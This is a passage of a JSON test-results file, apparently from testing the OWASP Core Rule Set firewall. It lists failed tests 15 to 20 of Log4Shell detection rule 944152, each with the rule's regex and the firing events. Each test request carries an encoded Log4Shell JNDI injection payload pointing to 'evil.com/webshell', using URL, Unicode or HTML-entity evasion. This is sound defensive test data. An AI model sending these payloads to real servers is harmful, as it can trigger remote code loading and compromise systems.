          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 15,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with Unicode escape evasion, wrapped in URL encoding evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 15,
      "desc" : "Log4J exploit on JSON with Unicode escape evasion, wrapped in URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24%5Cu007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 16,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with URL encoding evasion, wrapped in Unicode escape evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 16,
      "desc" : "Log4J exploit on JSON with URL encoding evasion, wrapped in Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"\\u002524%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 17,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with URL encoding evasion, mixed with Unicode escape evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 17,
      "desc" : "Log4J exploit on JSON with URL encoding evasion, mixed with Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24\\u007Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 18,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion wrapped in URL encoding evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 18,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion wrapped in URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24%26lbrace%3Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 19,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with numeric HTML entity evasion wrapped in URL encoding evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 19,
      "desc" : "Log4J exploit on JSON with numeric HTML entity evasion wrapped in URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%26%2336%3B%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 20,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 20,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u0026lbrace;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 21,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
